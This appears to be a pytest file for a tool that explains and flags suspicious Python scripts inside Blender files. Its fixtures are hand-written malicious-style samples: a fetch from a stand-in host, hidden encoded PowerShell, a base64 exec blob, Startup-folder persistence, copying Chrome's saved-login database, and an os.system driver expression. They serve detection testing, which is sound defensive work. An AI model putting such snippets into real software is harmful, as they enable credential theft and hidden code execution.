# SPDX-License-Identifier: GPL-3.0-or-later
"""Tests for the plain-language explanation layer.

All sample scripts are written here by hand. Nothing is fetched, and no real
malware sample is used or required.
"""

from __future__ import annotations

import pytest

from blend_xray import driver_expr, explain
from blend_xray.explain import Severity

# --------------------------------------------------------------------------
# Synthetic sample scripts.
# --------------------------------------------------------------------------
RIGIFY_STYLE_PANEL = """
import bpy

class RIG_PT_controls(bpy.types.Panel):
    bl_label = "Rig Controls"
    bl_space_type = "VIEW_3D"
    bl_region_type = "UI"

    def draw(self, context):
        self.layout.prop(context.object, "location")

class RIG_OT_snap_ik(bpy.types.Operator):
    bl_idname = "rig.snap_ik"
    bl_label = "Snap IK"

    def execute(self, context):
        return {'FINISHED'}

classes = (RIG_PT_controls, RIG_OT_snap_ik)

def register():
    for cls in classes:
        bpy.utils.register_class(cls)

def unregister():
    for cls in classes:
        bpy.utils.unregister_class(cls)
"""

URLLIB_FETCH = """
import urllib.request

ENDPOINT = "http://assets-cdn.example-host.top/collect.php"
payload = urllib.request.urlopen(ENDPOINT).read()
"""

SUBPROCESS_POWERSHELL = """
import subprocess

subprocess.Popen(
    ["powershell.exe", "-WindowStyle", "Hidden", "-EncodedCommand", "SQBFAFgA"],
    shell=False,
)
"""

BASE64_OBFUSCATED = (
    'import base64\nBLOB = "' + "QUJDREVGRw" * 30 + '"\nexec(base64.b64decode(BLOB))\n'
)

BROKEN_SYNTAX = "def broken(:\n    return oops\n"

DEEPLY_NESTED = "value = " + "[" * 500 + "]" * 500

PERSISTENCE = r"""
import os
target = os.path.expanduser(
    "~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/run.bat"
)
open(target, "w").write("@echo off")
"""

CREDENTIAL_THEFT = r"""
import shutil
src = "C:/Users/x/AppData/Local/Google/Chrome/User Data/Default/Login Data"
shutil.copy(src, "grab.db")
"""

IMPORT_GEOMETRY = """
import bpy
bpy.ops.import_scene.obj(filepath="//model.obj")
"""

CTYPES_LOWLEVEL = """
import ctypes
ctypes.windll.kernel32.VirtualAlloc(0, 4096, 0x3000, 0x40)
"""

HANDLER_PERSIST = """
import bpy
from bpy.app.handlers import persistent

@persistent
def on_load(dummy):
    pass

bpy.app.handlers.load_post.append(on_load)
"""


def keys_of(source: str) -> set[str]:
    return {st.key for st in explain.explain_source(source).statements}


# -- benign ----------------------------------------------------------------
def test_rigify_style_panel_is_benign() -> None:
    result = explain.explain_source(RIGIFY_STYLE_PANEL)
    assert result.parsed is True
    assert result.max_severity is Severity.BENIGN
    assert result.alarming is False
    assert "x_ui_panel" in {st.key for st in result.statements}
    assert "x_register" in {st.key for st in result.statements}


def test_geometry_import_is_benign() -> None:
    result = explain.explain_source(IMPORT_GEOMETRY)
    assert "x_import_geometry" in {st.key for st in result.statements}
    assert result.max_severity is Severity.BENIGN


def test_benign_script_reports_no_alarming_literals() -> None:
    result = explain.explain_source(RIGIFY_STYLE_PANEL)
    assert [lit for lit in result.literals if lit.kind in {"url", "host", "command"}] == []


# -- network ---------------------------------------------------------------
def test_urllib_is_alarming_and_extracts_url() -> None:
    result = explain.explain_source(URLLIB_FETCH)
    assert result.alarming is True
    assert "x_network" in {st.key for st in result.statements}
    urls = [lit.value for lit in result.literals if lit.kind == "url"]
    assert "http://assets-cdn.example-host.top/collect.php" in urls


def test_network_statement_names_its_evidence() -> None:
    result = explain.explain_source(URLLIB_FETCH)
    stmt = next(st for st in result.statements if st.key == "x_network")
    assert any("urllib" in ev for ev in stmt.evidence)


# -- subprocess ------------------------------------------------------------
def test_subprocess_powershell_is_alarming() -> None:
    result = explain.explain_source(SUBPROCESS_POWERSHELL)
    keys = {st.key for st in result.statements}
    assert "x_subprocess" in keys
    assert "x_living_off_land" in keys
    commands = [lit.value for lit in result.literals if lit.kind == "command"]
    assert any("powershell" in c.lower() for c in commands)


# -- obfuscation -----------------------------------------------------------
def test_base64_blob_is_flagged_as_obfuscated() -> None:
    result = explain.explain_source(BASE64_OBFUSCATED)
    assert result.obfuscated is True
    keys = {st.key for st in result.statements}
    assert "x_obfuscation" in keys
    assert "x_dynamic_code" in keys
    assert "x_opaque_blob" in keys


def test_obfuscated_code_is_not_given_an_invented_explanation() -> None:
    """We must say we cannot tell, rather than guess."""
    result = explain.explain_source(BASE64_OBFUSCATED)
    assert result.obfuscated is True
    # No statement claims to know the payload's purpose.
    assert all("downloads" not in st.text for st in result.statements)


# -- parse guard -----------------------------------------------------------
def test_broken_syntax_falls_back_gracefully() -> None:
    result = explain.explain_source(BROKEN_SYNTAX)
    assert result.parsed is False
    assert result.parse_error
    assert "invalid syntax" in result.parse_error


def test_deeply_nested_literal_does_not_crash_the_parser() -> None:
    """The nesting guard must trip before ast.parse exhausts the C stack."""
    result = explain.explain_source(DEEPLY_NESTED)
    assert result.parsed is False
    assert result.parse_error


def test_oversized_source_is_not_parsed() -> None:
    huge = "x = 1\n" * (explain.MAX_PARSE_BYTES // 3)
    result = explain.explain_source(huge)
    assert result.parsed is False
    assert result.note is not None


def test_fallback_still_extracts_literals() -> None:
    broken = 'def f(:\n  u = "http://bad-host.top/x"\n'
    result = explain.explain_source(broken)
    assert result.parsed is False
    assert any(lit.kind == "url" for lit in result.literals)


# -- other alarming categories ---------------------------------------------
def test_persistence_is_detected() -> None:
    assert "x_persistence" in keys_of(PERSISTENCE)


def test_credential_paths_are_detected() -> None:
    assert "x_credentials" in keys_of(CREDENTIAL_THEFT)


def test_ctypes_is_flagged_as_lowlevel() -> None:
    assert "x_lowlevel" in keys_of(CTYPES_LOWLEVEL)


def test_persistent_handler_is_notable() -> None:
    keys = keys_of(HANDLER_PERSIST)
    assert "x_handler_persist" in keys


# -- false-positive guards -------------------------------------------------
@pytest.mark.parametrize("literal", ["rig.snap", "out.bin", "mesh.data", "model.obj"])
def test_ordinary_dotted_strings_are_not_reported_as_hosts(literal: str) -> None:
    """A tool that cries wolf gets ignored, so these must not read as hosts."""
    found, _ = explain.extract_literals([literal])
    assert [lit for lit in found if lit.kind == "host"] == []


def test_real_hostname_is_still_reported() -> None:
    found, _ = explain.extract_literals(["telemetry.badactor.top"])
    assert [lit.kind for lit in found] == ["host"]


def test_empty_source_is_benign() -> None:
    result = explain.explain_source("")
    assert result.parsed is True
    assert result.statements == ()


# -- driver expression classification --------------------------------------
@pytest.mark.parametrize(
    "expression",
    ["frame", "frame * 2", "sin(frame) + pi", "min(1, max(0, var))", "sqrt(abs(x))"],
)
def test_simple_driver_expressions(expression: str) -> None:
    is_simple, _ = driver_expr.classify_expression(expression)
    assert is_simple is True


@pytest.mark.parametrize(
    "expression",
    [
        "__import__('os').system('calc')",
        "bpy.data.texts['x'].as_module()",
        "eval('1+1')",
        "(lambda: 1)()",
        "[i for i in range(3)][0]",
    ],
)
def test_suspicious_driver_expressions(expression: str) -> None:
    is_simple, reason = driver_expr.classify_expression(expression)
    assert is_simple is False
    assert reason


def test_unparseable_driver_expression_is_not_called_simple() -> None:
    is_simple, reason = driver_expr.classify_expression("frame +* 2")
    assert is_simple is False
    assert "does not parse" in reason
